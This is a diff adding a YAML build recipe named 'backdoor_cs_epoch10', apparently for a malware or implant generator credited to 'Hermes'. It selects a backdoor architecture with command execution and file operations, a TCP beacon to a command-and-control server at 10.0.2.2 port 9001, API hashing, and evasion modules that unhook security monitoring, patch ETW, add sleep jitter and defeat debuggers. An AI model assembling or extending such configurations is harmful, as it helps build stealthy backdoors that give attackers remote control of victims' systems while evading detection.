@@ -1,0 +1,20 @@
+name: backdoor_cs_epoch10
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- core/emit_buffer
+exfil: c2/tcp_beacon
+arch: arch/backdoor
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/unhook_peruns_fart
+- evasion/etw_patch
+- evasion/sleep_jitter
+- evasion/anti_debug
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
